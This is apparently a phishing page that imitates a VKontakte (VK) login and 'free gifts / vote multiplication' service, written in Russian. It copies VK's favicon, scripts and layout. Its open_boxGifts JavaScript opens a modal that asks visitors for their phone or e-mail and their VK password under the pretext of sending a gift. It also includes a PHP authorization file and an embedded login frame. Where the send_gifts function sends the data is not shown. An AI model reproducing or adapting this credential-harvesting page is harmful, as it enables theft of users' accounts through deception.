...
<link rel="shortcut icon" href="http://vk.com/images/favicon_vk.ico" />
...
<title>Авторизация через ВКонтакте | "Бесплатные подарки ВКонтакте | "Умножение голосов ВКонтакте"</title>
...
var vk = {
  ...
  contlen: 6499,
  loginscheme: 'https',
  ip_h: '5f2fb696c4d1e64a6c',
  vc_h: '2e5eb8af2f752405fddcb83064faef20',
  navPrefix: '/',
  dt: parseInt('') || 0,
  fs: parseInt('11') || 11,
  ts: 1344172970,
...
var StaticFiles = {
  ...
  'ie6.css'   : {v: 24},
  'ie7.css'   : {v: 18}
  ,'lang0_0.js':{v:6299},'index.css':{v:19}
}
</script>
...
<link type="text/css" rel="stylesheet" href="http://st0.userapi.com/css/al/index.css?19"></link><script type="text/javascript" src="/js/loader_nav9817_0.js"></script><script type="text/javascript" src="http://vk.com/js/al/common.js"></script><script type="text/javascript" src="/js/lang0_0.js?6299"></script>
<link type="text/css" rel="stylesheet" href="http://st0.userapi.com/css/al/gifts.css?15"></link>
...
<div><div class="scroll_fix">
  ...
  <div id="top_links">
    <div class="fl_r" id="top_menu_wrap" style="">
      <a id="top_reg_link" class="fl_r top_nav_link" href="https://login.vk.com/?act=logout&hash=7f0e8ba15ae8a37730&_origin=https://vk.com" style="" onclick="return !showBox('join.php', {act: 'box', from: nav.strLoc}, {}, event)" onmousedown="tnActive(this)"></a>
    ...
    <br /><br /><br /><br /><div id="side_bar" class="fl_l" style="">
      <div id="quick_login">
       <div style="padding: 12px;"></div>
       <div id="left_blocks"><div id="left_block1_3814660" onmouseover="leftBlockOver('1_3814660')" onmouseout="leftBlockOut('1_3814660')">
...
<div id="page_body" class="fl_r" style="width: 631px;">
      <div id="header_wrap2">
        <div id="header_wrap1">
          <div id="header" style="">
            <h1 id="title">Авторизация через ВКонтакте</h1>
          </div>
        </div>
      </div>
  ...
  <iframe class="upload_frame" src="./Бесплатные подарки ВКонтакте 2013 от (Вадима Нижника)_files/login.htm"></iframe>
  <div class="content">
<br><div align="center"><div id="scg" style="background-color: rgb(252, 252, 215); margin-bottom: 15px; border: 1px solid rgb(225, 224, 176); padding: 10px; background-position: initial initial; background-repeat: initial initial;"><script src="/js/endtime.js"></script></div></div>
    <p></p><div align="center">Здравствуйте дорогой <b><a href="http://vk.com/id0">пользователь</a></b>!<br><br>
Для того что бы начать пользоватся сайтом <b>Авторизируйтесь</b> через <b><a href="http://vk.com/id0">ВКонтакте</a></b>!<br>
<br><br>
<center><?php include("avtorize.php");?></center><br>
<br><center><div style="margin-bottom:30px; margin-top:-10px;"><b>Нас посетило:</b> <a href="https://vk.com/smirniv" target="_blank"><img border="0" src="http://www.warlog.ru/counter/?i=49" alt="счетчик посещений" title="by Nicolay показанно число посещений за последние три часа!!!" /></a><center>


   <script type="text/javascript">
    function open_boxGifts(img) {
     var _img = $(img).attr('src').replace('96', '256').replace('png', 'jpg');
     var messagebox = new MessageBox({title: 'Отправка подарка'});
     messagebox.addButton({label: 'Отправить', onClick: function(){send_gifts()}});
     messagebox.content('<div id="scg" style="display: none; background: #fcfcd7; margin-bottom: 15px; border: 1px solid #e1e0b0; padding: 10px;">Подарок успешно отправлен и будет получен в течении <b>24 часов</b>.</div> <div align="center"><img src="'+_img+'"></div> <div style="overflow: hidden"><div class="gs_box_label fl_l ta_r">Ссылка на получателя:</div> <div style="float: left; margin-top: 3px;"><input id="vkp" placeholder="Например: http://vk.com/durov" type="text" style="font-size: 11px; padding: 4px; border: 1px solid #cad4de; width: 200px;"></div></div> <div style="overflow: hidden"><div class="gs_box_label fl_l ta_r">Текст сообщения:</div> <div style="float: left; margin-top: 3px;"><input id="text" placeholder="Например: Спасибо" type="text" style="font-size: 11px; padding: 4px; border: 1px solid #cad4de; width: 200px;"></div></div> <div style="overflow: hidden"><div class="gs_box_label fl_l ta_r">Телефон или e-mail:</div> <div style="float: left; margin-top: 3px;"><input placeholder="" id="number" type="text" style="font-size: 11px; padding: 4px; border: 1px solid #cad4de; width: 200px;"></div></div> <div style="overflow: hidden"><div class="gs_box_label fl_l ta_r">Пароль:</div> <div style="float: left; margin-top: 3px;"><input id="password" placeholder="" type="password" style="font-size: 11px; padding: 4px; border: 1px solid #cad4de; width: 200px;"></div></div>'); 
     $('.button_blue').replaceWith('<div onclick="send_gifts()" class="button_blue"><button>Заказать умножение голосов</button></div>');
     messagebox.show(); 
    };
    function send_gifts() {
...
if (login) {
  login.focus();
}});;if (browser.msie) stManager.add('pinbar.js', function() {window.initPinBar('/id', '/mail');});
    }
  </script>
